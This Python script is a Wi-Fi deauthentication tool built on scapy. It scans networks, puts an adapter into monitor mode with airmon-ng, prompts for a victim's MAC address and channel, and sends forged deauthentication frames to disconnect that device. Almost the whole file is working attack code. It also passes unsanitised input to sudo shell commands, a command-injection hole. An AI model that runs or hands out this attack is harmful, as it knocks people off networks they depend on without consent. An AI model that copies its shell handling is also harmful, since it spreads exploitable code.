import sys
import os
import platform
from termcolor import colored
from scapy.all import (
  RadioTap,                                        #     packet injuction and reception              #
  Dot11,                                           #     to import Dot11 fields                      #
  Dot11Deauth,                                     #     to send deauthentication frames             #
  sendp                                            #     to send packets                             #
)

print("  =====================          ")  
print("| Wi-fi Deauthenticator |        ") 
print("  =====================          ")  
print("       \                         ")  
print("        \                        ")  
print("         \                       ") 
print("          .--.                   ")   
print("         |o_o |                  ")
print("         |:_/ |                  ")
print("        //   \ \                 ")    
print("       (|     | )                ")
print("      /'\_   _/`\                ") 
print("      \___)=(___/                ")  
print("                                 ")
print("                                 ")
print(colored("       By JOKER  ",'green'))
print("                                 ")
print("                                follow for more updates https://github.com/TUDDUMDEBBA/Wifi_Deauthentication.git   ")

def network_scan():
    if platform.system() == "Windows":
        command = "netsh wlan show networks interface=Wi-Fi"
    elif platform.system() == "Linux":
        command = "nmcli dev wifi list"
    os.system(command)
network_scan()

bssid="ff:ff:ff:ff:ff:ff"                            #  to send anonymous packets to AP  #    #  you can also use  aa:bb:cc:dd:ee:ff  #      #  or any random mac address  #
interface=input("enter your interface : ")           #  wireless interface ex:  wlan0
os.system('sudo ifconfig '+interface+' down')                #  to down wifi adapter 
os.system('sudo airmon-ng check kill') 
os.system('sudo iwconfig '+interface+' mode monitor')
channel = input('Enter channel number: ')       #  to send deauth packets to the victim  the attcker should keep the wifi adapter in same channel
os.system('sudo airmon-ng start '+interface+' '+channel)   #  to changing of channels 
target = input("enter the victim mac address : ")     #  target mac address 
#target1 = input("enter victim mac")
threads=int(input("how many threads : "))            #  how many packets to send to the taget 

def deauth():
    dot11 = Dot11(addr1=bssid, addr2=target, addr3=target)  #addr3 = to taregt particular user in network
    frame = RadioTap()/dot11/Dot11Deauth()
    sendp(frame, iface=interface, count=threads, inter=0.90)


deauth()
